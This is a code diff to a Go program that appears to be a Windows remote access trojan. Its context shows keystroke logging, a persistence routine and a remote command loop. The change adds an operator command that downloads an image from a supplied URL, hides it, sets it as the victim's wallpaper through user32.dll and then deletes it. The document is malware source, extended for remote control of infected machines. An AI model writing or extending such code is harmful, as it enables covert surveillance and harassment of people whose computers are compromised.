@@ -371,6 +371,28 @@ func listenKeystrokes(stat bool) {
 	}
 	keyboard.Uninstall()
 }
+func setWallpaper(path *uint16) {
+	user32 := syscall.NewLazyDLL("user32.dll")
+	proc := user32.NewProc("SystemParametersInfoW")
+
+	proc.Call(20, 0, uintptr(unsafe.Pointer(path)))
+}
+
+func getWallpaper(url string) {
+	resp, err := http.Get(url)
+	if err == nil {
+		data, _ := io.ReadAll(resp.Body)
+		os.WriteFile("temp.jpg", data, 0644)
+
+		path, _ := filepath.Abs("temp.jpg")
+		pathPtr := syscall.StringToUTF16Ptr(path)
+		syscall.SetFileAttributes(pathPtr, syscall.FILE_ATTRIBUTE_HIDDEN)
+
+		setWallpaper(pathPtr)
+		time.Sleep(time.Second)
+		os.Remove(path)
+	}
+}
 
 func main() {
 	persist()
@@ -479,6 +501,10 @@ func main() {
 					}
 				}
 				os.WriteFile(strings.TrimSpace(filename), []byte(DATA.String()), 0644)
+
+			case "\x15":
+				path, _ := System.reader.ReadString('\n')
+				go getWallpaper(strings.TrimSpace(path))
 			}
 
 			time.Sleep(time.Millisecond * 200)
